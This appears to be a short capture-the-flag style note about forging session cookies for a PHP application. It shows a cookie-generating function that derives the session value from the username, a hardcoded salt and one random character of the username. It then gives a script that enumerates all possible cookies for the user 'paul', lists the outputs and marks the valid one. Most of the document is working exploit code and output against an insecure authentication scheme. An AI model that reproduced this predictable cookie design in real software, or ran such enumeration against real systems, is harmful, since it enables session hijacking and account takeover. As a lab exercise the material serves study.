# Cookie.php 

```php

<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```


# New cookie.php

```php
<?php

$username = "paul";
$max = strlen($username) - 1;
for ($seed = 0; $seed <= $max; $seed++){
	$key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    	$session_cookie = $username.md5($key);
    	echo $session_cookie."\n";
}

?>
```


Cookies:

paula2a6a014d3bee04d7df8d5837d62e8c5
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paul47200b180ccd6835d25d034eeb6e6390 <--- the one